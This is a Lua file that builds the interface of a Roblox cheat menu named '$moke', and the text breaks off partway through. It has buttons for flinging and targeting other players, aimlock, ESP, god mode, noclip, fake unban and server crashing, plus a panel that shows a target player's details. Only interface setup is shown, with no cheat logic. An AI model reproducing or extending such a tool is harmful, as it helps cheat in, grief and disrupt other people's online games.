-- Gui to Lua
-- Version: 3.2

-- Instances:

local smoke = Instance.new("ScreenGui")
local MainFrame = Instance.new("Frame")
local TabsHolder = Instance.new("Frame")
local UIListLayout = Instance.new("UIListLayout")
local HomeBtn = Instance.new("TextButton")
local MainScriptsBtn = Instance.new("TextButton")
local SideScriptsBtn = Instance.new("TextButton")
local TogglesBtn = Instance.new("TextButton")
local QuickTpBtn = Instance.new("TextButton")
local SellingToolsBtn = Instance.new("TextButton")
local InviteLinkBtn = Instance.new("TextButton")
local GuiName = Instance.new("TextLabel")
local UIGradient = Instance.new("UIGradient")
local PageContainer = Instance.new("Frame")
local HomePage = Instance.new("Frame")
local doxXDXDXD = Instance.new("Frame")
local UIListLayout_2 = Instance.new("UIListLayout")
local TargetImage = Instance.new("ImageLabel")
local UICorner = Instance.new("UICorner")
local TargetTextbox = Instance.new("TextBox")
local CashLabel = Instance.new("TextLabel")
local BountyLabel = Instance.new("TextLabel")
local CrewLabel = Instance.new("TextLabel")
local HomeButtonHolder = Instance.new("Frame")
local View = Instance.new("TextButton")
local Fling = Instance.new("TextButton")
local Target = Instance.new("TextButton")
local GoTo = Instance.new("TextButton")
local UIListLayout_3 = Instance.new("UIListLayout")
local PageTitle = Instance.new("TextLabel")
local MainScriptsPage = Instance.new("Frame")
local PageTitle_2 = Instance.new("TextLabel")
local ButtonHolder = Instance.new("Frame")
local UIGridLayout = Instance.new("UIGridLayout")
local FlySpeedMinus = Instance.new("TextButton")
local Fly = Instance.new("TextButton")
local FlySpeedPlus = Instance.new("TextButton")
local FreeFists = Instance.new("TextButton")
local FlyMode = Instance.new("TextButton")
local GodArmor = Instance.new("TextButton")
local GodBlock = Instance.new("TextButton")
local Headless = Instance.new("TextButton")
local NoRecoil = Instance.new("TextButton")
local NoClip = Instance.new("TextButton")
local Reach = Instance.new("TextButton")
local SideScriptsPage = Instance.new("Frame")
local PageTitle_3 = Instance.new("TextLabel")
local ButtonHolder_2 = Instance.new("Frame")
local UIGridLayout_2 = Instance.new("UIGridLayout")
local Aimlock = Instance.new("TextButton")
local Autofarm = Instance.new("TextButton")
local Esp = Instance.new("TextButton")
local FullGod = Instance.new("TextButton")
local GrenadeLock = Instance.new("TextButton")
local HighTool = Instance.new("TextButton")
local InfTools = Instance.new("TextButton")
local Invisible = Instance.new("TextButton")
local LastingBullets = Instance.new("TextButton")
local MoneyESP = Instance.new("TextButton")
local RpgLock = Instance.new("TextButton")
local Spin = Instance.new("TextButton")
local TaserLock = Instance.new("TextButton")
local Unban = Instance.new("TextButton")
local Users = Instance.new("TextButton")
local TogglesPage = Instance.new("Frame")
local PageTitle_4 = Instance.new("TextLabel")
local ButtonHolder_3 = Instance.new("Frame")
local UIGridLayout_3 = Instance.new("UIGridLayout")
local Toggle = Instance.new("Frame")
local AntiSlowColor = Instance.new("Frame")
local AntiSlow = Instance.new("TextButton")
local Toggle_2 = Instance.new("Frame")
local CashAuraColor = Instance.new("Frame")
local CashAura = Instance.new("TextButton")
local Toggle_3 = Instance.new("Frame")
local AntiStompColor = Instance.new("Frame")
local AntiStomp = Instance.new("TextButton")
local Toggle_4 = Instance.new("Frame")
local AutoBlockColor = Instance.new("Frame")
local AutoBlock = Instance.new("TextButton")
local Toggle_5 = Instance.new("Frame")
local AutoStompColor = Instance.new("Frame")
local AutoStomp = Instance.new("TextButton")
local Toggle_6 = Instance.new("Frame")
local AntiArrestColor = Instance.new("Frame")
local AntiArrest = Instance.new("TextButton")
local Toggle_7 = Instance.new("Frame")
local AutoDropColor = Instance.new("Frame")
local AutoDrop = Instance.new("TextButton")
local Toggle_8 = Instance.new("Frame")
local RocketRideColor = Instance.new("Frame")
local RocketRide = Instance.new("TextButton")
local Toggle_9 = Instance.new("Frame")
local AntiGrabColor = Instance.new("Frame")
local AntiGrab = Instance.new("TextButton")
local Toggle_10 = Instance.new("Frame")
local HideUserColor = Instance.new("Frame")
local HideUser = Instance.new("TextButton")
local Toggle_11 = Instance.new("Frame")
local QToTpColor = Instance.new("Frame")
local QToTp = Instance.new("TextButton")
local Toggle_12 = Instance.new("Frame")
local HideBlockColor = Instance.new("Frame")
local HideBlock = Instance.new("TextButton")
local Toggle_13 = Instance.new("Frame")
local AntiEffectsColor = Instance.new("Frame")
local AntiEffects = Instance.new("TextButton")
local Toggle_14 = Instance.new("Frame")
local AltArmorColor = Instance.new("Frame")
local AltArmor = Instance.new("TextButton")
local Toggle_15 = Instance.new("Frame")
local AntiBagColor = Instance.new("Frame")
local AntiBag = Instance.new("TextButton")
local QuickTpPage = Instance.new("Frame")
local PageTitle_5 = Instance.new("TextLabel")
local ButtonHolder_4 = Instance.new("Frame")
local UIGridLayout_4 = Instance.new("UIGridLayout")
local Bank = Instance.new("TextButton")
local GasStation = Instance.new("TextButton")
local GunShop1 = Instance.new("TextButton")
local GunShop2 = Instance.new("TextButton")
local LavaBase = Instance.new("TextButton")
local LoadPos = Instance.new("TextButton")
local Playground = Instance.new("TextButton")
local PrevPosition = Instance.new("TextButton")
local SafeZone1 = Instance.new("TextButton")
local SafeZone2 = Instance.new("TextButton")
local SavePos = Instance.new("TextButton")
local SetSpawn = Instance.new("TextButton")
local Sewer = Instance.new("TextButton")
local TacoShop = Instance.new("TextButton")
local UFO = Instance.new("TextButton")
local SellingToolsPage = Instance.new("Frame")
local PageTitle_6 = Instance.new("TextLabel")
local CashTextbox = Instance.new("TextBox")
local CalculateButton = Instance.new("TextButton")
local DropToggleButton = Instance.new("TextButton")
local CashAtEndLabel = Instance.new("TextLabel")
local CrashServerButton = Instance.new("TextButton")
local Ver = Instance.new("TextLabel")
local DropShadowHolder = Instance.new("Frame")
local DropShadow = Instance.new("ImageLabel")
local CloseBtn = Instance.new("TextButton")

--Properties:

smoke.Name = "smoke"
smoke.Parent = game.CoreGui
smoke.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

MainFrame.Name = "MainFrame"
MainFrame.Parent = smoke
MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
MainFrame.BorderSizePixel = 0
MainFrame.Position = UDim2.new(0.200171828, 0, 0.428220838, 0)
MainFrame.Size = UDim2.new(0, 572, 0, 353)

TabsHolder.Name = "TabsHolder"
TabsHolder.Parent = MainFrame
TabsHolder.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
TabsHolder.BackgroundTransparency = 1.000
TabsHolder.BorderColor3 = Color3.fromRGB(17, 17, 17)
TabsHolder.BorderSizePixel = 0
TabsHolder.Position = UDim2.new(0.0126533778, 0, 0.0961713493, 0)
TabsHolder.Size = UDim2.new(0, 134, 0, 286)

UIListLayout.Parent = TabsHolder
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.Padding = UDim.new(0, 10)

HomeBtn.Name = "HomeBtn"
HomeBtn.Parent = TabsHolder
HomeBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
HomeBtn.BorderSizePixel = 0
HomeBtn.Size = UDim2.new(0, 134, 0, 32)
HomeBtn.AutoButtonColor = false
HomeBtn.Font = Enum.Font.SourceSansBold
HomeBtn.Text = "Home"
HomeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
HomeBtn.TextSize = 20.000

MainScriptsBtn.Name = "MainScriptsBtn"
MainScriptsBtn.Parent = TabsHolder
MainScriptsBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
MainScriptsBtn.BorderSizePixel = 0
MainScriptsBtn.Size = UDim2.new(0, 134, 0, 32)
MainScriptsBtn.AutoButtonColor = false
MainScriptsBtn.Font = Enum.Font.SourceSansBold
MainScriptsBtn.Text = "Main Scripts"
MainScriptsBtn.TextColor3 = Color3.fromRGB(149, 149, 149)
MainScriptsBtn.TextSize = 20.000

SideScriptsBtn.Name = "SideScriptsBtn"
SideScriptsBtn.Parent = TabsHolder
SideScriptsBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
SideScriptsBtn.BorderSizePixel = 0
SideScriptsBtn.Size = UDim2.new(0, 134, 0, 32)
SideScriptsBtn.AutoButtonColor = false
SideScriptsBtn.Font = Enum.Font.SourceSansBold
SideScriptsBtn.Text = "Side Scripts"
SideScriptsBtn.TextColor3 = Color3.fromRGB(149, 149, 149)
SideScriptsBtn.TextSize = 20.000

TogglesBtn.Name = "TogglesBtn"
TogglesBtn.Parent = TabsHolder
TogglesBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
TogglesBtn.BorderSizePixel = 0
TogglesBtn.Size = UDim2.new(0, 134, 0, 32)
TogglesBtn.AutoButtonColor = false
TogglesBtn.Font = Enum.Font.SourceSansBold
TogglesBtn.Text = "Toggles"
TogglesBtn.TextColor3 = Color3.fromRGB(149, 149, 149)
TogglesBtn.TextSize = 20.000

QuickTpBtn.Name = "QuickTpBtn"
QuickTpBtn.Parent = TabsHolder
QuickTpBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
QuickTpBtn.BorderSizePixel = 0
QuickTpBtn.Size = UDim2.new(0, 134, 0, 32)
QuickTpBtn.AutoButtonColor = false
QuickTpBtn.Font = Enum.Font.SourceSansBold
QuickTpBtn.Text = "Quick TP"
QuickTpBtn.TextColor3 = Color3.fromRGB(149, 149, 149)
QuickTpBtn.TextSize = 20.000

SellingToolsBtn.Name = "SellingToolsBtn"
SellingToolsBtn.Parent = TabsHolder
SellingToolsBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
SellingToolsBtn.BorderSizePixel = 0
SellingToolsBtn.Size = UDim2.new(0, 134, 0, 32)
SellingToolsBtn.AutoButtonColor = false
SellingToolsBtn.Font = Enum.Font.SourceSansBold
SellingToolsBtn.Text = "Selling Tools"
SellingToolsBtn.TextColor3 = Color3.fromRGB(149, 149, 149)
SellingToolsBtn.TextSize = 20.000

InviteLinkBtn.Name = "InviteLinkBtn"
InviteLinkBtn.Parent = TabsHolder
InviteLinkBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
InviteLinkBtn.BorderSizePixel = 0
InviteLinkBtn.Size = UDim2.new(0, 134, 0, 32)
InviteLinkBtn.AutoButtonColor = false
InviteLinkBtn.Font = Enum.Font.SourceSansBold
InviteLinkBtn.Text = "Invite Link"
InviteLinkBtn.TextColor3 = Color3.fromRGB(149, 149, 149)
InviteLinkBtn.TextSize = 20.000

GuiName.Name = "GuiName"
GuiName.Parent = MainFrame
GuiName.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
GuiName.BackgroundTransparency = 1.000
GuiName.Position = UDim2.new(0.0126533778, 0, -0.00144081004, 0)
GuiName.Size = UDim2.new(0, 134, 0, 35)
GuiName.Font = Enum.Font.SourceSansBold
GuiName.Text = "$moke"
GuiName.TextColor3 = Color3.fromRGB(255, 255, 255)
GuiName.TextSize = 30.000
GuiName.TextWrapped = true
GuiName.TextXAlignment = Enum.TextXAlignment.Left

UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(93, 45, 254)), ColorSequenceKeypoint.new(0.19, Color3.fromRGB(91, 51, 254)), ColorSequenceKeypoint.new(0.68, Color3.fromRGB(35, 248, 238)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(33, 255, 237))}
UIGradient.Parent = GuiName

PageContainer.Name = "PageContainer"
PageContainer.Parent = MainFrame
PageContainer.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
PageContainer.BorderSizePixel = 0
PageContainer.Position = UDim2.new(0.272418141, 0, 0.0876726806, 0)
PageContainer.Size = UDim2.new(0, 405, 0, 311)

HomePage.Name = "HomePage"
HomePage.Parent = PageContainer
HomePage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
HomePage.BackgroundTransparency = 1.000
HomePage.BorderSizePixel = 0
HomePage.Size = UDim2.new(0, 405, 0, 311)

doxXDXDXD.Name = "doxXDXDXD"
doxXDXDXD.Parent = HomePage
doxXDXDXD.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
doxXDXDXD.BackgroundTransparency = 1.000
doxXDXDXD.BorderSizePixel = 0
doxXDXDXD.Position = UDim2.new(0.0222222209, 0, 0.0896494538, 0)
doxXDXDXD.Size = UDim2.new(0, 156, 0, 275)

UIListLayout_2.Parent = doxXDXDXD
UIListLayout_2.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIListLayout_2.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout_2.Padding = UDim.new(0, 1)

TargetImage.Name = "TargetImage"
TargetImage.Parent = doxXDXDXD
TargetImage.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
TargetImage.Size = UDim2.new(0, 100, 0, 100)
TargetImage.Image = "rbxassetid://0"

UICorner.CornerRadius = UDim.new(0, 2147483647)
UICorner.Parent = TargetImage

TargetTextbox.Name = "TargetTextbox"
TargetTextbox.Parent = doxXDXDXD
TargetTextbox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
TargetTextbox.BackgroundTransparency = 1.000
TargetTextbox.BorderSizePixel = 0
TargetTextbox.Position = UDim2.new(0.306172848, 0, 0.49196142, 0)
TargetTextbox.Size = UDim2.new(0, 156, 0, 29)
TargetTextbox.Font = Enum.Font.SourceSansBold
TargetTextbox.PlaceholderText = "Username"
TargetTextbox.Text = ""
TargetTextbox.TextColor3 = Color3.fromRGB(255, 255, 255)
TargetTextbox.TextSize = 20.000

CashLabel.Name = "CashLabel"
CashLabel.Parent = doxXDXDXD
CashLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CashLabel.BackgroundTransparency = 1.000
CashLabel.BorderSizePixel = 0
CashLabel.Position = UDim2.new(0.306172848, 0, 0.49196142, 0)
CashLabel.Size = UDim2.new(0, 156, 0, 29)
CashLabel.Font = Enum.Font.SourceSansBold
CashLabel.Text = "Cash : N/A"
CashLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
CashLabel.TextScaled = true
CashLabel.TextSize = 25.000
CashLabel.TextWrapped = true

BountyLabel.Name = "BountyLabel"
BountyLabel.Parent = doxXDXDXD
BountyLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BountyLabel.BackgroundTransparency = 1.000
BountyLabel.BorderSizePixel = 0
BountyLabel.Position = UDim2.new(0.306172848, 0, 0.49196142, 0)
BountyLabel.Size = UDim2.new(0, 156, 0, 29)
BountyLabel.Font = Enum.Font.SourceSansBold
BountyLabel.Text = "Bounty : N/A"
BountyLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
BountyLabel.TextScaled = true
BountyLabel.TextSize = 25.000
BountyLabel.TextWrapped = true

CrewLabel.Name = "CrewLabel"
CrewLabel.Parent = doxXDXDXD
CrewLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CrewLabel.BackgroundTransparency = 1.000
CrewLabel.BorderSizePixel = 0
CrewLabel.Position = UDim2.new(0.306172848, 0, 0.49196142, 0)
CrewLabel.Size = UDim2.new(0, 156, 0, 29)
CrewLabel.Font = Enum.Font.SourceSansBold
CrewLabel.Text = "Crew : N/A"
CrewLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
CrewLabel.TextScaled = true
CrewLabel.TextSize = 25.000
CrewLabel.TextWrapped = true

HomeButtonHolder.Name = "HomeButtonHolder"
HomeButtonHolder.Parent = HomePage
HomeButtonHolder.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
HomeButtonHolder.BackgroundTransparency = 1.000
HomeButtonHolder.BorderSizePixel = 0
HomeButtonHolder.Position = UDim2.new(0.432098776, 0, 0.0353697762, 0)
HomeButtonHolder.Size = UDim2.new(0, 222, 0, 291)

View.Name = "View"
View.Parent = HomeButtonHolder
View.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
View.BorderSizePixel = 0
View.Size = UDim2.new(0, 220, 0, 44)
View.AutoButtonColor = false
View.Font = Enum.Font.SourceSansBold
View.Text = "View"
View.TextColor3 = Color3.fromRGB(255, 255, 255)
View.TextSize = 20.000

Fling.Name = "Fling"
Fling.Parent = HomeButtonHolder
Fling.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Fling.BorderSizePixel = 0
Fling.Position = UDim2.new(0, 0, 0.151959613, 0)
Fling.Size = UDim2.new(0, 220, 0, 44)
Fling.AutoButtonColor = false
Fling.Font = Enum.Font.SourceSansBold
Fling.Text = "Fling"
Fling.TextColor3 = Color3.fromRGB(255, 255, 255)
Fling.TextSize = 20.000

Target.Name = "Target"
Target.Parent = HomeButtonHolder
Target.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Target.BorderSizePixel = 0
Target.Position = UDim2.new(0, 0, 0.303919226, 0)
Target.Size = UDim2.new(0, 220, 0, 44)
Target.AutoButtonColor = false
Target.Font = Enum.Font.SourceSansBold
Target.Text = "Target"
Target.TextColor3 = Color3.fromRGB(255, 255, 255)
Target.TextSize = 20.000

GoTo.Name = "GoTo"
GoTo.Parent = HomeButtonHolder
GoTo.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
GoTo.BorderSizePixel = 0
GoTo.Position = UDim2.new(0, 0, 0.455878913, 0)
GoTo.Size = UDim2.new(0, 220, 0, 44)
GoTo.AutoButtonColor = false
GoTo.Font = Enum.Font.SourceSansBold
GoTo.Text = "Goto"
GoTo.TextColor3 = Color3.fromRGB(255, 255, 255)
GoTo.TextSize = 20.000

UIListLayout_3.Parent = HomeButtonHolder
UIListLayout_3.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout_3.Padding = UDim.new(0, 10)

PageTitle.Name = "PageTitle"
PageTitle.Parent = HomePage
PageTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
PageTitle.BackgroundTransparency = 1.000
PageTitle.Position = UDim2.new(0.0225298852, 0, -0.000382794446, 0)
PageTitle.Size = UDim2.new(0, 148, 0, 20)
PageTitle.Font = Enum.Font.SourceSansBold
PageTitle.Text = "Home"
PageTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
PageTitle.TextSize = 15.000
PageTitle.TextWrapped = true
PageTitle.TextXAlignment = Enum.TextXAlignment.Left

MainScriptsPage.Name = "MainScriptsPage"
MainScriptsPage.Parent = PageContainer
MainScriptsPage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainScriptsPage.BackgroundTransparency = 1.000
MainScriptsPage.BorderSizePixel = 0
MainScriptsPage.Size = UDim2.new(0, 405, 0, 311)
MainScriptsPage.Visible = false

PageTitle_2.Name = "PageTitle"
PageTitle_2.Parent = MainScriptsPage
PageTitle_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
PageTitle_2.BackgroundTransparency = 1.000
PageTitle_2.Position = UDim2.new(0.0225298852, 0, -0.000382794446, 0)
PageTitle_2.Size = UDim2.new(0, 148, 0, 20)
PageTitle_2.Font = Enum.Font.SourceSansBold
PageTitle_2.Text = "Main Scripts"
PageTitle_2.TextColor3 = Color3.fromRGB(255, 255, 255)
PageTitle_2.TextSize = 15.000
PageTitle_2.TextWrapped = true
PageTitle_2.TextXAlignment = Enum.TextXAlignment.Left

ButtonHolder.Name = "ButtonHolder"
ButtonHolder.Parent = MainScriptsPage
ButtonHolder.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ButtonHolder.BackgroundTransparency = 1.000
ButtonHolder.Position = UDim2.new(0.0345679, 0, 0.0675241128, 0)
ButtonHolder.Size = UDim2.new(0, 376, 0, 275)

UIGridLayout.Parent = ButtonHolder
UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIGridLayout.CellSize = UDim2.new(0, 120, 0, 50)

FlySpeedMinus.Name = "FlySpeedMinus"
FlySpeedMinus.Parent = ButtonHolder
FlySpeedMinus.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
FlySpeedMinus.BorderSizePixel = 0
FlySpeedMinus.Position = UDim2.new(0.0444444455, 0, 0.0836012885, 0)
FlySpeedMinus.Size = UDim2.new(0, 134, 0, 32)
FlySpeedMinus.Font = Enum.Font.SourceSansBold
FlySpeedMinus.Text = "Fly Speed -"
FlySpeedMinus.TextColor3 = Color3.fromRGB(255, 255, 255)
FlySpeedMinus.TextSize = 20.000

Fly.Name = "Fly"
Fly.Parent = ButtonHolder
Fly.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Fly.BorderSizePixel = 0
Fly.Position = UDim2.new(0.0444444455, 0, 0.0836012885, 0)
Fly.Size = UDim2.new(0, 134, 0, 32)
Fly.Font = Enum.Font.SourceSansBold
Fly.Text = "Fly(X)"
Fly.TextColor3 = Color3.fromRGB(255, 255, 255)
Fly.TextSize = 20.000

FlySpeedPlus.Name = "FlySpeedPlus"
FlySpeedPlus.Parent = ButtonHolder
FlySpeedPlus.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
FlySpeedPlus.BorderSizePixel = 0
FlySpeedPlus.Position = UDim2.new(0.0444444455, 0, 0.0836012885, 0)
FlySpeedPlus.Size = UDim2.new(0, 134, 0, 32)
FlySpeedPlus.Font = Enum.Font.SourceSansBold
FlySpeedPlus.Text = "Fly Speed +"
FlySpeedPlus.TextColor3 = Color3.fromRGB(255, 255, 255)
FlySpeedPlus.TextSize = 20.000

FreeFists.Name = "FreeFists"
FreeFists.Parent = ButtonHolder
FreeFists.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
FreeFists.BorderSizePixel = 0
FreeFists.Position = UDim2.new(0.0444444455, 0, 0.0836012885, 0)
FreeFists.Size = UDim2.new(0, 134, 0, 32)
FreeFists.Font = Enum.Font.SourceSansBold
FreeFists.Text = "Free Fist(T)"
FreeFists.TextColor3 = Color3.fromRGB(255, 255, 255)
FreeFists.TextSize = 20.000

FlyMode.Name = "FlyMode"
FlyMode.Parent = ButtonHolder
FlyMode.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
FlyMode.BorderSizePixel = 0
FlyMode.Position = UDim2.new(0.0444444455, 0, 0.0836012885, 0)
FlyMode.Size = UDim2.new(0, 134, 0, 32)
FlyMode.Font = Enum.Font.SourceSansBold
FlyMode.Text = "Fly Mode"
FlyMode.TextColor3 = Color3.fromRGB(255, 255, 255)
FlyMode.TextSize = 20.000

GodArmor.Name = "GodArmor"
GodArmor.Parent = ButtonHolder
GodArmor.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
GodArmor.BorderSizePixel = 0
GodArmor.Position = UDim2.new(0.0444444455, 0, 0.0836012885, 0)
GodArmor.Size = UDim2.new(0, 134, 0, 32)
GodArmor.Font = Enum.Font.SourceSansBold
GodArmor.Text = "God Armor"
GodArmor.TextColor3 = Color3.fromRGB(255, 255, 255)
GodArmor.TextSize = 20.000

GodBlock.Name = "GodBlock"
GodBlock.Parent = ButtonHolder
GodBlock.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
GodBlock.BorderSizePixel = 0
GodBlock.Position = UDim2.new(0.0444444455, 0, 0.0836012885, 0)
GodBlock.Size = UDim2.new(0, 134, 0, 32)
GodBlock.Font = Enum.Font.SourceSansBold
GodBlock.Text = "God Block"
GodBlock.TextColor3 = Color3.fromRGB(255, 255, 255)
GodBlock.TextSize = 20.000

Headless.Name = "Headless"
Headless.Parent = ButtonHolder
Headless.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Headless.BorderSizePixel = 0
Headless.Position = UDim2.new(0.0444444455, 0, 0.0836012885, 0)
Headless.Size = UDim2.new(0, 134, 0, 32)
Headless.Font = Enum.Font.SourceSansBold
Headless.Text = "Headless"
Headless.TextColor3 = Color3.fromRGB(255, 255, 255)
Headless.TextSize = 20.000

NoRecoil.Name = "NoRecoil"
NoRecoil.Parent = ButtonHolder
NoRecoil.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
NoRecoil.BorderSizePixel = 0
NoRecoil.Position = UDim2.new(0.0444444455, 0, 0.0836012885, 0)
NoRecoil.Size = UDim2.new(0, 134, 0, 32)
NoRecoil.Font = Enum.Font.SourceSansBold
NoRecoil.Text = "No Recoil"
NoRecoil.TextColor3 = Color3.fromRGB(255, 255, 255)
NoRecoil.TextSize = 20.000

NoClip.Name = "NoClip"
NoClip.Parent = ButtonHolder
NoClip.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
NoClip.BorderSizePixel = 0
NoClip.Position = UDim2.new(0.0444444455, 0, 0.0836012885, 0)
NoClip.Size = UDim2.new(0, 134, 0, 32)
NoClip.Font = Enum.Font.SourceSansBold
NoClip.Text = "Noclip(Z)"
NoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
NoClip.TextSize = 20.000

Reach.Name = "Reach"
Reach.Parent = ButtonHolder
Reach.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Reach.BorderSizePixel = 0
Reach.Position = UDim2.new(0.0444444455, 0, 0.0836012885, 0)
Reach.Size = UDim2.new(0, 134, 0, 32)
Reach.Font = Enum.Font.SourceSansBold
Reach.Text = "Reach"
Reach.TextColor3 = Color3.fromRGB(255, 255, 255)
Reach.TextSize = 20.000

SideScriptsPage.Name = "SideScriptsPage"
SideScriptsPage.Parent = PageContainer
SideScriptsPage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SideScriptsPage.BackgroundTransparency = 1.000
SideScriptsPage.BorderSizePixel = 0
SideScriptsPage.Size = UDim2.new(0, 405, 0, 311)
SideScriptsPage.Visible = false

PageTitle_3.Name = "PageTitle"
PageTitle_3.Parent = SideScriptsPage
PageTitle_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
PageTitle_3.BackgroundTransparency = 1.000
PageTitle_3.Position = UDim2.new(0.0225298852, 0, -0.000382794446, 0)
PageTitle_3.Size = UDim2.new(0, 148, 0, 20)
PageTitle_3.Font = Enum.Font.SourceSansBold
PageTitle_3.Text = "Side Scripts"
PageTitle_3.TextColor3 = Color3.fromRGB(255, 255, 255)
PageTitle_3.TextSize = 15.000
PageTitle_3.TextWrapped = true
PageTitle_3.TextXAlignment = Enum.TextXAlignment.Left

ButtonHolder_2.Name = "ButtonHolder"
ButtonHolder_2.Parent = SideScriptsPage
ButtonHolder_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ButtonHolder_2.BackgroundTransparency = 1.000
ButtonHolder_2.Position = UDim2.new(0.0345679, 0, 0.0675241128, 0)
ButtonHolder_2.Size = UDim2.new(0, 376, 0, 275)

UIGridLayout_2.Parent = ButtonHolder_2
UIGridLayout_2.SortOrder = Enum.SortOrder.LayoutOrder
UIGridLayout_2.CellSize = UDim2.new(0, 120, 0, 50)

Aimlock.Name = "Aimlock"
Aimlock.Parent = ButtonHolder_2
Aimlock.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Aimlock.BorderSizePixel = 0
Aimlock.Position = UDim2.new(0.0218890235, 0, 0.590557039, 0)
Aimlock.Size = UDim2.new(0, 94, 0, 46)
Aimlock.Font = Enum.Font.SourceSansBold
Aimlock.Text = "Aimlock"
Aimlock.TextColor3 = Color3.fromRGB(255, 255, 255)
Aimlock.TextSize = 20.000

Autofarm.Name = "Autofarm"
Autofarm.Parent = ButtonHolder_2
Autofarm.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Autofarm.BorderSizePixel = 0
Autofarm.Position = UDim2.new(0.351977378, 0, 0.762864709, 0)
Autofarm.Size = UDim2.new(0, 94, 0, 46)
Autofarm.Font = Enum.Font.SourceSansBold
Autofarm.Text = "Autofarm"
Autofarm.TextColor3 = Color3.fromRGB(255, 255, 255)
Autofarm.TextSize = 20.000

Esp.Name = "Esp"
Esp.Parent = ButtonHolder_2
Esp.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Esp.BorderSizePixel = 0
Esp.Position = UDim2.new(0.355005682, 0, 0.221326202, 0)
Esp.Size = UDim2.new(0, 94, 0, 46)
Esp.Font = Enum.Font.SourceSansBold
Esp.Text = "Esp"
Esp.TextColor3 = Color3.fromRGB(255, 255, 255)
Esp.TextSize = 20.000

FullGod.Name = "FullGod"
FullGod.Parent = ButtonHolder_2
FullGod.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
FullGod.BorderSizePixel = 0
FullGod.Position = UDim2.new(0.0218890235, 0, 0.762864709, 0)
FullGod.Size = UDim2.new(0, 94, 0, 46)
FullGod.Font = Enum.Font.SourceSansBold
FullGod.Text = "FullGod"
FullGod.TextColor3 = Color3.fromRGB(255, 255, 255)
FullGod.TextSize = 20.000

GrenadeLock.Name = "GrenadeLock"
GrenadeLock.Parent = ButtonHolder_2
GrenadeLock.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
GrenadeLock.BorderSizePixel = 0
GrenadeLock.Position = UDim2.new(0.680955052, 0, 0.221326202, 0)
GrenadeLock.Size = UDim2.new(0, 94, 0, 46)
GrenadeLock.Font = Enum.Font.SourceSansBold
GrenadeLock.Text = "GrenadeLock"
GrenadeLock.TextColor3 = Color3.fromRGB(255, 255, 255)
GrenadeLock.TextSize = 20.000

HighTool.Name = "HighTool"
HighTool.Parent = ButtonHolder_2
HighTool.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
HighTool.BorderSizePixel = 0
HighTool.Position = UDim2.new(0.352205783, 0, 0.409230769, 0)
HighTool.Size = UDim2.new(0, 94, 0, 46)
HighTool.Font = Enum.Font.SourceSansBold
HighTool.Text = "High Tool"
HighTool.TextColor3 = Color3.fromRGB(255, 255, 255)
HighTool.TextSize = 20.000

InfTools.Name = "InfTools"
InfTools.Parent = ButtonHolder_2
InfTools.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
InfTools.BorderSizePixel = 0
InfTools.Position = UDim2.new(0.0221175179, 0, 0.409230769, 0)
InfTools.Size = UDim2.new(0, 94, 0, 46)
InfTools.Font = Enum.Font.SourceSansBold
InfTools.Text = "InfTools"
InfTools.TextColor3 = Color3.fromRGB(255, 255, 255)
InfTools.TextSize = 20.000

Invisible.Name = "Invisible"
Invisible.Parent = ButtonHolder_2
Invisible.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Invisible.BorderSizePixel = 0
